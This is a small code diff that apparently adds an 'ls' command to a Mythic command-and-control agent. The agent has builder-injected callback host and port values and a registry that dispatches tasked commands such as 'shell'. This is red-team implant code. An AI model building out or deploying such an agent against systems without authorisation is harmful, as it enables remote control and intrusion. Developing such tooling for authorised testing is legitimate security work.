@@ -13,7 +13,7 @@ import sys
 # Command imports under this comment are used in the COMMANDS registry to link Mythic commands to their handler functions
 from commands import shell as cmd_shell
 from commands import exit as cmd_exit
-
+from commands import ls as cmd_ls
 # --- Injected by builder via string substitution ---
 CALLBACK_HOST   = "REPLACE_CALLBACK_HOST"
 CALLBACK_PORT   = int("REPLACE_CALLBACK_PORT")
@@ -102,6 +102,7 @@ def post_response(callback_id, task_id, output):
 COMMANDS = {
     "shell": cmd_shell.execute,
     "exit":  cmd_exit.execute,
+    "ls":    cmd_ls.execute
 }
 
 # Handles a single task by looking up the command in the registry and executing it
